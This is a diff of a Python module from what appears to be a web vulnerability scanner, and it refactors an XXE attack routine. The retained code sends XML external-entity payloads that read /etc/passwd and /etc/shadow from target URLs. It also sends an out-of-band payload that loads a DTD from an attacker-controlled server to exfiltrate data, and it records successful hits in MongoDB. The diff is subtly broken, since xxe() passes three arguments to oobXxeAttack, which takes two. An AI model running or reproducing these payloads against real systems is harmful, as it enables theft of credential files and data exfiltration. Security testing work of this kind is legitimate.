@@ -5,18 +5,13 @@ from pymongo.cursor import CursorType
 import requests
 from bs4 import BeautifulSoup
 
-
-ATTACKERSERVER = ""
 client_socket = ""
 session = requests.Session()
-mongo = "" 
-
-
-
 
 class schema :
-    def __init__(self, type : str) :
-        self.type = type
+    def __init__(self, detail_type : str) :
+        self.type = "xxe"
+        self.detail_type = detail_type
         self.url = ''
         self.isHack = False
         self.totUse = 0
@@ -31,7 +26,6 @@ class schema :
 
     def setisHack(self):
         self.isHack = True
-        
 
     def settotUse(self, totUse : int) :
         self.totUse = totUse
@@ -48,36 +42,18 @@ def getMsg(client_socket) :
     data = client_socket.recv(1024)
     return data
 
-def insertItem(item : schema):
-    global mongo
-    db_name = "WAS"   
-    collection_name = "xxe" 
-    
+def insertItem(item : schema , mongo):
     data = {
         "type" : item.type ,
+        "detail_type" : item.detail_type,
         "url" : item.url ,
         "isHack":item.isHack,
         "totUse" : item.totUse,
         "content" : item.content
         }
 
-    mongo[db_name][collection_name].insert_one(data)
+    mongo.insert_one(data)
 
-
-# db에서 모든 값을 읽어옴 
-def findItem():
-    global mongo
-    db_name = "WAS"     # static 
-    collection_name = "xxe" #static
-    result = mongo[db_name][collection_name].find(
-                                                {"isHack" : True } ,
-                                                {"_id" : 0 ,
-                                                "type" : 1,
-                                                "url" : 1,
-                                                "content":1}
-                                                ).sort("url")
-
-    return result 
 
 
 
@@ -85,19 +61,15 @@ def findItem():
 # routine : 메인 호출 부분
 # argument : None
 # return value : None
-def xxe(target_urls : list):
-    db_name = "WAS"   
-    collection_name = "xxe" 
 
-    mongo[db_name][collection_name].drop()
-
-    genXxeAttack(target_urls)
+# XXE Point
+def xxe(target_urls : list , mongo , attacker_server):
+    genXxeAttack(target_urls , mongo)
 
     sendMsg(client_socket, "reset".encode())
 
-    oobXxeAttack(target_urls)
+    oobXxeAttack(target_urls, mongo , attacker_server)
 
-    finalDetail()
 
 
 
@@ -106,7 +78,7 @@ def xxe(target_urls : list):
 # argument : None
 # return value : None
 
-def genXxeAttack(target_urls : list):
+def genXxeAttack(target_urls : list , mongo):
     target_files = {
     "root:x:"  : "file:///etc/passwd",
     "root:$" : "file:///etc/shadow" 
@@ -142,7 +114,7 @@ def genXxeAttack(target_urls : list):
                     new_schema.setisHack()
                     new_schema.setContent(response_data)
                 
-                insertItem(new_schema)
+                insertItem(new_schema, mongo)
 
 
 def getNameList(url : str) -> list :
@@ -179,113 +151,18 @@ def getNameList(url : str) -> list :
     return name_list
 
 
-    
 
 # routine : oob xxe exploit을 보냄
 # return value : None
-def oobXxeAttack(target_urls : list):
-
-    global target_url, session
-
-
+def oobXxeAttack(target_urls : list , attacker_server : str):
+    global session
     headers = {'Content-Type': 'application/xml;charset=UTF-8',
                 'Accept': 'application/xml' }
 
     for target_url in target_urls:
-        url = '{}url/{}'.format(ATTACKERSERVER,target_url)
-        requests.get(url)   
+        url = '{}url/{}'.format(attacker_server,target_url)
+        requests.get(url)  
         # Crafting XXE Payload
-        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(ATTACKERSERVER)
+        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
         response = session.post(target_url, data = payload, headers = headers)
             
-
-# routine : 최종 report 를 출력해주는 부분
-# argument : None
-# return value : None
-def finalDetail():
-    resultRequest()
-
-    cursor = findItem()
-    prior_url = str()
-    for doc in cursor:
-        url = doc.get("url")
-        if url != prior_url:
-            print("\n\n  [ {} ]  \n".format(url))
-        for key, value in doc.items():
-            if(key == "url") :
-                prior_url = value
-                continue
-            print( " {}  :  {} ".format(key,value) )
-
-
-
-# routine : 공격자 서버에서 공격 log 를 받아옴 
-# argument : None
-# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )
-
-def resultRequest():
-    sendMsg(client_socket, "result".encode("utf-8"))
-    data = getMsg(client_socket)
-    sendMsg(client_socket, data)
-    data_transferred = 0 
-    result = str()
-
-
-    if data == None:
-        print("\n\n   [ ERROR : File does not exist in server ] \n\n")
-        return "RESULT_ERROR"
-
-    
-    try:
-        while data:
-            result += repr(data)
-            data_transferred += len(data)
-            data = getMsg(client_socket).decode("utf-8")
-            sendMsg(client_socket, data.encode("utf-8"))
-            if(data == "end"):
-                break
-    except Exception as ex:
-            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
-            return "RESULT_ERROR"
-
-
-    #print("\n\n** [ LOG ] Size of transferred data  : {} bytes \n\n".format(data_transferred))
-    craftResult(result)
-    
-
-
-# routine : 받아온 log를 필터링 함
-# argument : 원본 로그 
-# return value : 필터링한 로그 
-
-def craftResult(result : str):
-    result = '"""{}"""'.format(result)    
-    new_schema = schema("OOB")     
-    result = result.split("\\n")
-    url = str()
-
-    for line in result:
-        try:
-            if( int(line.split(' ')[8]) != 404):
-                continue
-        except:
-            continue
-
-
-        line = re.sub("''","",line)
-        if(line.find('/exploit/') != -1) : 
-            new_schema.setContent(line[line.find('/exploit/'):line.find('http/1.1')])
-        else :
-            if(new_schema.url) :
-                count_use = new_schema.content.count('\n')
-                new_schema.setisHackOob(count_use)
-                insertItem(new_schema)
-
-                new_schema = schema("OOB")
-            new_schema.setUrl(line[line.find('/url') + 5:])
-
-    count_use = new_schema.content.count('\n')
-    new_schema.setisHackOob(count_use)
-    insertItem(new_schema)
-    
-
